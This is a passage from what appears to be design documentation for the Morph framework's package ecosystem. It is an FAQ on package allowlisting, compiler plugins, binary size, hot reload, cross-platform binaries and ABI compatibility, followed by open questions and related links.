compromise surface.

**Q: Can enterprises enforce "only @morph/* packages"?**
A: Yes — `morph.config.json`:
```json
{
  "security": { "allowNativePackages": ["@morph/*"] }
}
```
CI fails if any other native package is added.

**Q: What if I want reproducible builds from source?**
A: `morph pkg rebuild <name>@<version>` compiles from source (requires
Rust toolchain for plugins, C++ toolchain for native). Registry will offer
source-built binaries as an option in P2+.

**Q: Can a package really replace `morphState` with its own reactivity?**
A: Yes — that is exactly what compiler plugins (L4) are for. The package
lowers `createSignal` to its own signal implementation instead of ours.
Same import shape, different compiled output. It cannot change components
you didn't import — lowering only applies to imports from that package.

**Q: Will packages bloat my binary?**
A: Only what you use ships. File-level (unimported files never join the
graph), component-level (demand-driven expansion), symbol-level P1 sweep
(unused helpers dropped), and `FeatureSet` (unused runtime features
compiled out) all stack. A 5,000-icon package you use once costs one icon.
See [Lean Binaries](lean-binaries.md) for the budget this must not break.

**Q: Can packages work in `morph dev` hot reload?**
A: Yes. Package files join `graph.all_paths()`, so the watcher picks them
up automatically. Edit a package component → graph re-resolves → logic
recompiles → window updates. Package C++ edits recompile like user
`cpp_sources` do today.

**Q: What happens if two packages handle the same import?**
A: First-match-wins in dependency order (`morph.config.json` order).
Explicit and predictable. A future `morph check` rule may warn on overlap
so it never surprises you.

**Q: Can I use npm packages directly (`import x from 'lodash'`)?**
A: Not raw npm — browser/Node APIs (`document`, `fs`, `process`) have no
native counterpart and fail today (`mx-import-type`, `mx-js-global`). But a
Morph package can *wrap* an npm algorithm (pure logic, no DOM/Node APIs)
by vendoring the source as `.ts`. The long-term Node.js story is tracked
in [Node.js Support](../javascript/nodejs.md).

**Q: Do packages work on all three OSes?**
A: Pure L1 packages: yes, trivially. L2/L3/L4: the author ships per-platform
binaries (`plugin/linux-x64`, `plugin/macos-arm64`, `plugin/windows-x64`)
and per-platform `native.libs`. `morph install` picks your platform.
Authors get CI templates that build all three.

**Q: Who owns a package's C++ ABI vs the Morph runtime version?**
A: The package declares compatible `morphc` ranges in its metadata, and the
registry records which runtime version each release was built against.
`morph install` refuses mismatches with an actionable error (`morph pkg
rebuild` from source is the escape hatch).

## Open questions

- **Multiple plugins handling the same import:** first-match-wins in
  dependency order (current proposal) vs hard error on overlap?
- **Granularity of `runtimeAccess`:** who owns the capability list
  (`morpher/src/runtime_capabilities.rs`?), and how fine (per-symbol vs
  per-subsystem)?
- **WASM plugins:** still worth a portable plugin target (one binary,
  every platform), now complementary to — not instead of — the default
  OS-process sandbox?
- **`morph pkg link`** local-dev workflow: ship with P0 or later?
- **Curated `@morph/*` namespace:** auto-trusted first-party packages to
  bootstrap the ecosystem?

## See also

- [Packages](packages.md) — JS→C++ build-bridge sub-plan
- [Viewport](../windows/viewport.md) — the built-in 3D escape hatch
- [WebView](../platform/webview.md) — OS-webview embedding (likely the first L3 package)
- [Rust Support](../javascript/rust.md) — `--to rust` codegen and `crates.io` access
- [Native C++ interop](../../guides/native-cpp.md) — today's per-project mechanism packages generalize
- [Custom C++ Nodes](../../guides/custom-cpp-nodes.md) — the `MorphNode` pattern packages wrap
- [Lean Binaries](lean-binaries.md) — the size budget the ecosystem must not break
- [Unsupported Import Type](../../errors/mx-import-type.md) — what bare imports do today
